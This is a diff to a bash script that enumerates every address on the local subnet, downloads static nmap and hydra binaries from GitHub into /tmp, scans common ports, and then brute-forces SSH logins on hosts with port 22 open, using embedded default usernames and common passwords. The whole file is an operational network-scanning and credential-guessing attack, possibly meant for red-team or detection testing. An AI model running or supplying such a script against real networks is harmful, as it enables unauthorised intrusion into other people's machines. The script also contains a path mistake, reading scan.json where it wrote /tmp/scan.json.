@@ -1,10 +1,77 @@
 #!/bin/bash
 
+# Function to convert IP address to decimal
+ip_to_dec() {
+    local IFS=.
+    read ip1 ip2 ip3 ip4 <<< "$1"
+    echo "$((ip1 * 16777216 + ip2 * 65536 + ip3 * 256 + ip4))"
+}
+
+# Function to convert decimal to IP address
+dec_to_ip() {
+    local ip dec=$1
+    for e in {3..0}; do
+        ((octet = dec / (256 ** e) ))
+        ((dec -= octet * 256 ** e))
+        ip+="${octet}."
+    done
+    echo "${ip%?}"
+}
+
+# Main function to generate IP list from CIDR
+generate_ips() {
+    local cidr="$1"
+    local ip="${cidr%/*}"
+    local prefix="${cidr#*/}"
+    local netmask=$((0xffffffff ^ ((1 << (32 - prefix)) - 1)))
+
+    local start=$(ip_to_dec "$ip")
+    local start=$((start & netmask))
+    local end=$((start | ((1 << (32 - prefix)) - 1)))
+
+    for ((ip= start; ip <= end; ip++)); do
+        dec_to_ip "$ip"
+    done
+}
+
+cat > /tmp/hydra-users.txt <<'EOF'
+root
+admin
+test
+guest
+info
+adm
+mysql
+user
+administrator
+oracle
+ftp
+pi
+puppet
+ansible
+ec2-user
+vagrant
+azureuser
+EOF
+cat > /tmp/hydra-passwords.txt <<'EOF'
+123456
+123456789
+111111
+password
+qwerty
+abc123
+12345678
+password1
+1234567
+123123
+EOF
 LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
-echo $LOCAL_NET > /tmp/hydra-targets.txt
+generate_ips "$LOCAL_NET" > /tmp/hydra-targets.txt
 echo $LOCAL_NET > /tmp/nmap-targets.txt
 python3 -m pip install jc
-curl -LJ https://github.com/credibleforce/static-hydra/raw/main/binaries/linux/x86_64/hydra -o /tmp/hydra && chmod 755 /tmp/hydra
-/tmp/hydra -V -L /tmp/users.txt -P /tmp/passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh | tee /tmp/hydra.txt
 curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
-/tmp/nmap -sT --top-ports -oX /tmp/scan.xml -iL /tmp/nmap-targets.txt $LOCAL_NET | jc --xml -p | tee /tmp/scan.json
+/tmp/nmap -sT -p80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389 -oX /tmp/scan.xml -iL /tmp/nmap-targets.txt && cat /tmp/scan.xml | jc --xml -p | tee /tmp/scan.json
+# find all ssh open ports
+cat scan.json | jq -r '.nmaprun.host[] | select(.ports.port."@portid"=="22" and .ports.port.state."@state"=="open") | .address."@addr"' > /tmp/hydra-targets.txt
+curl -LJ https://github.com/credibleforce/static-hydra/raw/main/binaries/linux/x86_64/hydra -o /tmp/hydra && chmod 755 /tmp/hydra
+/tmp/hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh | tee /tmp/hydra.txt
